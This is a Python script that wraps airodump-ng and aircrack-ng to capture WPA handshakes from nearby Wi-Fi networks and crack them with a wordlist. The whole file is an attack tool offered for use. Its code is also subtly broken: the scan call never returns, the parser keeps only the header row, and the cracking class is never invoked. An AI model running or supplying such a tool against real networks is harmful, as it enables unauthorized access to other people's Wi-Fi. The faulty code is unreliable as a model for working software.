import subprocess
import getmac


class WordlistAttackTool:
    def __init__(self, handshake_file, wordlist_file):
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file

    def run_wordlist_attack(self):
        """Perform wordlist attack using aircrack-ng"""
        print("Performing wordlist attack...")

        # Start wordlist attack using aircrack-ng
        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
        subprocess.call(cmd)

        print("Wordlist attack completed.")


class WifiScan:
    def __init__(self, adapter):
        self.adapter = adapter

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")

        # Get the current MAC address
        current_mac = getmac.get_mac_address(interface=self.adapter)
        print("Current MAC address:", current_mac)

        try:
            output = subprocess.check_output(['airodump-ng', '--output-format', 'csv', self.adapter],
                                             universal_newlines=True)
            bssids = []
            lines = output.splitlines()
            for line in lines:
                if line.strip().startswith('BSSID'):
                    bssid, channel, name = line.split(',', 3)[0:3]
                    bssids.append((bssid, channel, name))
            print("Available BSSIDs:")
            for i, (bssid, channel, name) in enumerate(bssids, start=1):
                print(f"{i}. BSSID: {bssid}, Channel: {channel}, Name: {name}")
            bssid_choice = int(input("Select the client BSSID: "))
            selected_bssid = bssids[bssid_choice - 1]
            channel = selected_bssid[1]
            client_bssid = selected_bssid[0]
            handshake_file = input("[+] Input handshake file name: ")
            subprocess.run([
                'airodump-ng',
                '--bssid', client_bssid,
                '--channel', channel,
                '--write', handshake_file,
                self.adapter
            ])
        except subprocess.CalledProcessError as e:
            print("Error: Failed to retrieve BSSIDs:", e)

    def run_wifi_scan(self):
        try:
            self.capture_handshake()
        except KeyboardInterrupt:
            pass


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WifiScan(adapter)
    tool.run_wifi_scan()


if __name__ == "__main__":
    main()
